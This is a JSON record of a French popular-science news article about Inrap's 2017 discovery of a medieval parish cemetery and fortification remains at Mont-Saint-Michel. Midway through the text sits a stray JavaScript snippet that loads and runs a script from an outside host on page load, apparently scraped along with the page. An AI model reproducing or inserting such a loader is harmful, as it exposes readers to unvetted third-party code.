{"title": "Mont-Saint-Michel : un cimetière du Moyen Âge mis au jour", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "01/02/2017", "content": "Le Mont-Saint-Michel est l'un des sites touristiques les plus visités en France. Pour les chercheurs, son histoire et celle des populations qui l'ont fait vivre gardent toujours une part de mystère. La découverte récente d'un cimetière datant du Moyen Âge apporte néanmoins de nouveaux éclairages. En janvier 2017, au détour de travaux de réfection de canalisations, des chercheurs de l'Institut national de recherches archéologiques préventives (Inrap) ont découvert, sous la rue principale du Mont-Saint-Michel, un cimetière paroissial datant du  Moyen Âge . La fouille a permis de mettre au jour une quarantaine de  sépultures  dans des états de conservation variés. Selon Elen Esnault, responsable de l'opération à l'Inrap, ce sont là les restes des  premiers habitants  du Mont-Saint-Michel qui ont été retrouvés. Car, en attendant une datation précise au carbone 14, qui devrait tomber début 2018, les chercheurs estiment que ce cimetière date d'avant le XIII e  siècle. Les premiers habitants du Mont-Saint-Michel se sont probablement installés sur le site au VIII e  siècle, au moment de la création du tout premier lieu de culte sur le rocher. Les études à venir devraient permettre d'en savoir plus sur leur mode de vie. © Emmanuelle Collado, Inrap                               Des informations sur la morphologie du village Ces travaux apportent de nouveaux éléments à propos du village, son évolution et sa morphologie.  « Nous l'imaginions plutôt en hauteur et assez restreint, et finalement, il était assez développé » , a raconté Elen Esnault à l'occasion d'une conférence tenue ce weekend. Le  premier village  du Mont-Saint-Michel semble ainsi s'être resserré au XIII e  siècle alors qu'il était plus étendu à l'origine.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  « On peut imaginer que le village s'est resserré pour mieux se protéger, après l'attaque des Bretons en 1204, au cours de laquelle il a été incendié, et a probablement subi des destructions assez importantes. »  Le rempart du XIII e  siècle a ensuite été démonté pour être reconstruit au XIV e  siècle sur son tracé actuel, puis, à nouveau, le village s'est progressivement étendu. Avec AFP Pour en savoir plus Mont-Saint-Michel : découverte d'un ancien cimetière et d'une fortification médiévale Les fouilles se poursuivent toujours sur la commune du Mont-Saint-Michel, à l'histoire longue et complexe, entre édifications, sièges militaires et fortifications. Après une décennie d'études, entre 2005 et 2015, qui ont révélé quelques épisodes méconnus, ce sont des travaux d'intervention sur les réseaux dans la Grande rue, près de l'église, qui ont, par surprise, exhumé une fortification médiévale et un cimetière paroissial. Ils vont être examinés de près. Article de l'Inrap paru le 01/02/2017 En 2005, une équipe de l' Inrap  avait mis au jour de nombreux moules en schiste destinés à la fabrication d'enseignes de pèlerinage, à l'emplacement d'un atelier de production daté des XIV e  et XV e  siècles, près de l'entrée de l'abbaye du  Mont-Saint-Michel . La variété et la qualité de ces pièces en font aujourd'hui une collection de référence en archéologie médiévale. En 2011, les archéologues ont révélé les vestiges d'une tour des fortifications, la tour Denis, ouvrage édifié vers 1479 et détruit en 1732. En 2015, d'anciennes maisons, donnant sur la grève et détruites en 1368, ont été étudiées. Dans l' abbaye , l'Inrap a suivi plusieurs chantiers de restauration conduits par l'architecte en chef des Monuments historiques dont les opérations importantes menées sur la Merveille, sur l'ancienne Hôtellerie de Robert de Torigny et sur les Logis abbatiaux. Aujourd'hui, la recherche des fortifications et de la  porte  du XIII e  siècle a permis la découverte, inattendue, du cimetière paroissial. Sous les pierres des bâtiments, des restes humains témoignent de la présence d’un cimetière, dont les historiens connaissaient l’existence mais que l’on pensait perdu. © Emmanuelle Collado, Inrap                               D’anciennes fortifications réapparaissent... et révèlent un cimetière médiéval Dans le cadre des travaux de réfection des réseaux menés par la commune du Mont-Saint-Michel, les archéologues de l'Inrap recherchent aux abords de l'église paroissiale, la fortification du XIII e  siècle et la porte du village, mentionnés dans un texte du XV e  siècle :  « Ledit d'Estouville et les moynes les firent renforcer l'an 1425, auquel temps la porte de la ville fut changée, estant vis-à-vis de l'église paroissiale, elle fut mise là où elle est à présent »  ( Le Roy , rééd. Decaëns, 2008). En 1204, les Bretons, alliés de Philippe-Auguste, roi de France, font le siège du Mont-Saint-Michel et mettent le  feu  au village et à l'abbaye :  « le tout fut facile à faire aux Bretons, car la ville n'estoit point close de muraille mais de pallis de  bois  seulement »  (même source). En 1256, sous l'impulsion de l'abbé Richard Turstin, une nouvelle enceinte en pierre est édifiée. C'est cette enceinte, arasée depuis, que les  archéologues  pensent avoir décelée sous la forme d'une large tranchée de récupération. Située dans l'axe du rempart conservé au sud de la tour Nord, cette tranchée opère un retour à angle droit vers l'ouest, marquant une chicane qui pourrait indiquer l'emplacement de la porte. Mais les travaux ont également révélé la présence du cimetière paroissial, pensé détruit par l'installation des réseaux en 1913. À l'origine, ce cimetière s'étendait sur un rayon de 30 m environ autour de l'église. Au moment de l'édification de la muraille de Turstin, le village semble se rétracter et une partie de ce cimetière est abandonnée. Abîmée, tronquée, bouleversée par les aménagements postérieurs, la trentaine de  sépultures  sauvegardées permet cependant aux anthropologues de recueillir de précieuses informations sur l'organisation des inhumations. Des  datations au carbone 14  et des études archéo-anthropologiques permettront une meilleure  datation  et la détermination de l'âge, du sexe et des éventuelles maladies ou  carences  des défunts. Ces données offriront ainsi un aperçu de la population du village du Mont-Saint-Michel avant le XIII e  siècle. Par ailleurs, le cloître de l'abbaye va faire l'objet de travaux visant à retrouver les niveaux d'origine des sols, exhaussés lors d'une phase de restauration. La fouille et l'étude de bâti menées à cette occasion documenteront l'état initial du cloître et ses éventuelles évolutions. Les études archéologiques menées au Mont-Saint-Michel par l'Inrap depuis 2001 abordent des aspects effleurés par les études historiques. Touchant à la fois l'abbaye, le village et les fortifications, elles permettent de renouveler et préciser l'histoire riche et mouvementée du Mont. Archéologie : découvrez le passionnant travail de l'anthropologue                       Lors de recherches archéologiques, il n’est pas rare de trouver d’anciens sites d’inhumation. Ces tombes renferment en général de nombreux indices et témoignages des civilisations passées que l’anthropologue saura interpréter précisément. L’Inrap (Institut national de recherches archéologiques préventives) nous parle de son travail au cours de cette courte vidéo.                                       ", "theme": "sciences"}